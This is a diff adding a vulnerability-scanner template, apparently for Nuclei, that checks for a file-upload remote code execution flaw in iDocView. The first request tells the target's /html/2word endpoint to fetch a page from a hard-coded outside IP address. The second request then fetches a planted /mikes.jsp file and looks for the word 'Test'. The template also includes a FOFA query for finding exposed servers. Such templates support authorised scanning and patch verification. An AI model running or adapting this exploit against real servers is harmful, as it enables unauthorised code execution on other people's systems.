@@ -1,0 +1,46 @@
+id: iDocView
+info:
+  name: iDocView uploadfile rce
+  author: mike
+  severity: info
+  description: iDocView是一个在线文档解析应用，旨在提供便捷的文件查看和编辑服务。
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: icon_hash="489934076"
+http:
+  - raw:
+      - |
+        GET /html/2word?url=http://114.55.0.23:20011/xxxx.html HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONIDocv=03E4E79B8A931599C2C8D51F96608331
+        Connection: close
+
+      - |
+        GET /mikes.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONIDocv=03E4E79B8A931599C2C8D51F96608331
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: body_2
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - "Test"
